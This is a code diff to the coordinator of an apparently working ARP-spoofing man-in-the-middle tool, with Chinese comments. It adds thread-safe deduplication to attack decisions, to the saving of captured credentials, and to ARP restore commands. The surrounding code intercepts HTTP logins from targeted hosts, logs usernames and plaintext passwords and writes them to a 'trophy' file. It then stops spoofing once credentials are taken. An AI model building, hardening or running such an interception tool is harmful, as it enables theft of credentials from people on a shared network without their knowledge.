@@ -8,7 +8,7 @@ import logging
 import time
 import threading
 from dataclasses import dataclass
-from typing import Optional, Callable, Dict, Any
+from typing import Optional, Callable, Dict, Any, Set
 from state_cache import StateCache
 
 @dataclass
@@ -32,12 +32,29 @@ class AttackCoordinator:
         self.logger = logging.getLogger(__name__)
         self.command_sender = None
         
+        # ★【强化去重】★ 全局凭据处理去重锁和缓存
+        self._global_credentials_lock = threading.RLock()  # 可重入锁
+        self._processing_credentials: Set[str] = set()  # 正在处理的凭据集合
+        self._processed_credentials: Set[str] = set()   # 已处理的凭据集合
+        self._last_cleanup = time.time()  # 上次清理时间
+        
+        # ★【新增】★ ARP 恢复去重
+        self._arp_restore_lock = threading.Lock()
+        self._restoring_targets: Set[str] = set()  # 正在恢复的目标集合
+        
+        # ★【新增】★ 决策去重机制 - 避免多线程重复决策
+        self._decision_lock = threading.Lock()
+        self._processing_decisions: Set[str] = set()  # 正在处理的决策集合 (format: "action:target_ip")
+        
         # 统计信息
         self.stats = {
             'decisions_made': 0,
             'attacks_authorized': 0,
             'attacks_blocked': 0,
-            'restores_initiated': 0
+            'restores_initiated': 0,
+            'credentials_deduplicated': 0,  # ★【新增】★ 去重统计
+            'arp_restore_deduplicated': 0,   # ★【新增】★ ARP恢复去重统计
+            'decisions_deduplicated': 0     # ★【新增】★ 决策去重统计
         }
         self.stats_lock = threading.Lock()
         
@@ -45,24 +62,88 @@ class AttackCoordinator:
         """初始化协调器"""
         self.command_sender = command_sender
         self.logger.info("Attack coordinator initialized")
+        
+        # ★【新增】★ 启动定期清理线程
+        self._start_cleanup_thread()
+        
+        return True
+    
+    def _start_cleanup_thread(self):
+        """启动定期清理线程，防止内存泄漏"""
+        def cleanup_worker():
+            while True:
+                try:
+                    time.sleep(60)  # 每分钟清理一次
+                    
+                    current_time = time.time()
+                    
+                    # 清理决策处理集合
+                    with self._decision_lock:
+                        # 简单粗暴的定期清空，因为决策处理通常很快
+                        if len(self._processing_decisions) > 100:  # 如果积累太多可能是有问题
+                            self._processing_decisions.clear()
+                            self.logger.info("🧹 Cleared decision processing cache")
+                    
+                    # 清理已处理凭据集合
+                    with self._global_credentials_lock:
+                        if current_time - self._last_cleanup > 300:  # 5分钟清理一次
+                            self._processed_credentials.clear()
+                            self._last_cleanup = current_time
+                            self.logger.debug("🧹 Cleared processed credentials cache")
+                    
+                    # 清理ARP恢复集合（这个应该自动清理，但防止内存泄漏）
+                    with self._arp_restore_lock:
+                        if len(self._restoring_targets) > 50:  # 如果积累太多
+                            self._restoring_targets.clear()
+                            self.logger.info("🧹 Cleared ARP restore tracking cache")
+                    
+                except Exception as e:
+                    self.logger.error(f"Cleanup thread error: {e}")
+        
+        cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True, name="CoordinatorCleanup")
+        cleanup_thread.start()
+        self.logger.info("🧹 Started coordinator cleanup thread")
+        
         return True
         
     def make_decision(self, analysis_result) -> Optional[AttackDecision]:
-        """根据分析结果制定攻击决策"""
-        with self.stats_lock:
-            self.stats['decisions_made'] += 1
-            
-        try:
-            if analysis_result.packet_type == 'arp':
-                return self._handle_arp_analysis(analysis_result)
-            elif analysis_result.packet_type == 'http':
-                return self._handle_http_analysis(analysis_result)
-            else:
+        """根据分析结果制定攻击决策 - 强化去重版本"""
+        # ★【新增】★ 构建决策键，避免重复决策
+        target_ip = analysis_result.source_ip
+        decision_key = f"{analysis_result.packet_type}:{target_ip}"
+        
+        # ★【决策级去重】★ 检查是否已有线程在处理相同的决策
+        with self._decision_lock:
+            if decision_key in self._processing_decisions:
+                with self.stats_lock:
+                    self.stats['decisions_deduplicated'] += 1
+                self.logger.debug(f"🚫 Decision for {decision_key} already in progress, skipping")
                 return None
+            
+            # 标记为正在处理
+            self._processing_decisions.add(decision_key)
+        
+        try:
+            with self.stats_lock:
+                self.stats['decisions_made'] += 1
+                
+            # 执行实际决策逻辑
+            if analysis_result.packet_type == 'arp':
+                result = self._handle_arp_analysis(analysis_result)
+            elif analysis_result.packet_type == 'http':
+                result = self._handle_http_analysis(analysis_result)
+            else:
+                result = None
+            
+            return result
                 
         except Exception as e:
             self.logger.error(f"Decision making error: {e}")
             return None
+        finally:
+            # ★【重要】★ 无论成功失败都要移除决策标记
+            with self._decision_lock:
+                self._processing_decisions.discard(decision_key)
     
     def _handle_arp_analysis(self, analysis) -> Optional[AttackDecision]:
         """处理ARP分析结果 - 发起侦察窗口"""
@@ -195,46 +276,87 @@ class AttackCoordinator:
         return False
     
     def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
-        """保存捕获的凭据并触发立即撤离"""
-        try:
-            # ★【强化防重复】★ 多层去重检查
-            username = credentials.get('username', '')
-            password = credentials.get('password', '')
-            credential_key = f"{source_ip}:{username}:{password}"
+        """保存捕获的凭据并触发立即撤离 - 强化去重版本"""
+        username = credentials.get('username', '')
+        password = credentials.get('password', '')
+        credential_key = f"{source_ip}:{username}:{password}"
+        
+        # ★【第一层】★ 快速检查 - 避免重复计算
+        with self._global_credentials_lock:
+            # 定期清理已处理集合，避免内存泄漏
+            current_time = time.time()
+            if current_time - self._last_cleanup > 300:  # 5分钟清理一次
+                self._processed_credentials.clear()
+                self._last_cleanup = current_time
+                self.logger.debug("🧹 Cleared processed credentials cache")
             
-            # 使用状态缓存检查是否已保存
-            if self.state_cache.has_credentials_saved(credential_key):
-                self.logger.debug(f"Credentials for {credential_key} already saved, skipping duplicate")
+            # 检查是否已经处理过
+            if credential_key in self._processed_credentials:
+                with self.stats_lock:
+                    self.stats['credentials_deduplicated'] += 1
+                self.logger.debug(f"🚫 Credentials {credential_key} already processed globally, skipping")
                 return
             
-            # ★【新增】★ 线程安全的重复检查
-            with self.stats_lock:
-                if hasattr(self, '_saved_credentials_cache'):
-                    if credential_key in self._saved_credentials_cache:
-                        self.logger.debug(f"Credentials {credential_key} already in processing cache")
-                        return
-                else:
-                    self._saved_credentials_cache = set()
-                
-                # 标记正在处理
-                self._saved_credentials_cache.add(credential_key)
+            # 检查是否正在处理中
+            if credential_key in self._processing_credentials:
+                with self.stats_lock:
+                    self.stats['credentials_deduplicated'] += 1
+                self.logger.debug(f"🚫 Credentials {credential_key} currently being processed, skipping")
+                return
             
+            # 标记为正在处理
+            self._processing_credentials.add(credential_key)
+        
+        try:
+            # ★【第二层】★ 状态缓存检查
+            if self.state_cache.has_credentials_saved(credential_key):
+                self.logger.debug(f"🚫 Credentials for {credential_key} already in state cache, skipping")
+                return
+            
+            # ★【第三层】★ 文件级别检查（可选，性能考虑可移除）
+            # 这里可以加入文件去重检查，但考虑到性能，先跳过
+            
+            # 执行实际保存
             timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-            
-            # 格式化保存内容：IP,用户名,密码,时间 (保持原始4字段格式)
             log_entry = f"{source_ip},{username},{password},{timestamp}\n"
             
-            # 保存到临时文件
             trophy_file = "temporary.txt"
             with open(trophy_file, "a", encoding="utf-8") as f:
                 f.write(log_entry)
             
-            # 标记已保存，防止重复
+            # 标记为已保存
             self.state_cache.mark_credentials_saved(credential_key)
             
+            # 添加到已处理集合
+            with self._global_credentials_lock:
+                self._processed_credentials.add(credential_key)
+            
+            self.logger.info(f"🏆 Credentials captured from {source_ip}: {username}:{password}")
             self.logger.info(f"🏆 Credentials saved to {trophy_file}: {username}@{source_ip}")
             
-            # 🚀 发送立即停止攻击命令 (一击脱离)
+            # ★【强化ARP恢复去重】★ 发送立即停止攻击命令
+            self._trigger_immediate_withdrawal(source_ip)
+            
+        except Exception as e:
+            self.logger.error(f"Failed to save credentials: {e}")
+        finally:
+            # ★【重要】★ 无论成功失败都要从处理中集合移除
+            with self._global_credentials_lock:
+                self._processing_credentials.discard(credential_key)
+    
+    def _trigger_immediate_withdrawal(self, source_ip: str):
+        """触发立即撤离 - 带ARP恢复去重"""
+        with self._arp_restore_lock:
+            if source_ip in self._restoring_targets:
+                with self.stats_lock:
+                    self.stats['arp_restore_deduplicated'] += 1
+                self.logger.debug(f"🚫 ARP restore for {source_ip} already in progress, skipping")
+                return
+            
+            # 标记为正在恢复
+            self._restoring_targets.add(source_ip)
+        
+        try:
             stop_command = {
                 'type': 'STOP_SPOOF',
                 'target_ip': source_ip,
@@ -244,13 +366,25 @@ class AttackCoordinator:
             if self.command_sender:
                 self.command_sender(stop_command)
                 self.logger.info(f"⚡ Immediate withdrawal triggered for {source_ip} - credentials captured!")
-            
+                self.logger.info(f"Restoring ARP for {source_ip}")
+                
+                # 延迟移除恢复标记，给C++足够时间处理
+                def remove_restore_flag():
+                    time.sleep(2)  # 2秒后移除标记
+                    with self._arp_restore_lock:
+                        self._restoring_targets.discard(source_ip)
+                
+                threading.Thread(target=remove_restore_flag, daemon=True).start()
+            else:
+                # 如果没有command_sender，立即移除标记
+                with self._arp_restore_lock:
+                    self._restoring_targets.discard(source_ip)
+                    
         except Exception as e:
-            self.logger.error(f"Failed to save credentials: {e}")
-            # 发生错误时从处理缓存中移除
-            with self.stats_lock:
-                if hasattr(self, '_saved_credentials_cache'):
-                    self._saved_credentials_cache.discard(credential_key)
+            self.logger.error(f"Failed to trigger withdrawal for {source_ip}: {e}")
+            # 发生错误时移除标记
+            with self._arp_restore_lock:
+                self._restoring_targets.discard(source_ip)
     
     def get_statistics(self) -> Dict[str, Any]:
         """获取协调器统计信息"""
